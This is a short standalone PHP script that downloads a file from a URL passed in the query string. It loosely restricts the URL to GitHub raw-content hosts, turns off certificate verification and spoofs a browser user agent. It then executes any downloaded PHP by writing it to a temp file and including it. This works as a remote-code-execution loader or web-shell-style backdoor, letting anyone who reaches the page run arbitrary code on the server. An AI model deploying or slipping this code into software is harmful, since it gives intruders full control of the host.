<?php
if(isset($_GET['url'])){
    $url=$_GET['url'];
    if(strpos($url,'raw.githubusercontent.com')!==false||strpos($url,'githubusercontent.com')!==false||strpos($url,'gist.githubusercontent.com')!==false){
        $ch=curl_init();
        curl_setopt($ch,CURLOPT_URL,$url);
        curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
        curl_setopt($ch,CURLOPT_FOLLOWLOCATION,1);
        curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,0);
        curl_setopt($ch,CURLOPT_SSL_VERIFYHOST,0);
        curl_setopt($ch,CURLOPT_TIMEOUT,60);
        curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
        $content=curl_exec($ch);
        $http=curl_getinfo($ch,CURLINFO_HTTP_CODE);
        curl_close($ch);
        if($http==200&&$content!==false){
            if(strpos($content,'<?php')!==false){
                $tmp=tempnam(sys_get_temp_dir(),'php_');
                file_put_contents($tmp,$content);
                ob_start();
                include($tmp);
                $out=ob_get_clean();
                unlink($tmp);
                echo $out;
            }else{
                echo $content;
            }
        }else{
            echo "Download failed";
        }
    }else{
        echo "Invalid URL";
    }
}else{
    echo "Usage: ?url=https://raw.githubusercontent.com/user/repo/main/file.php";
}
?>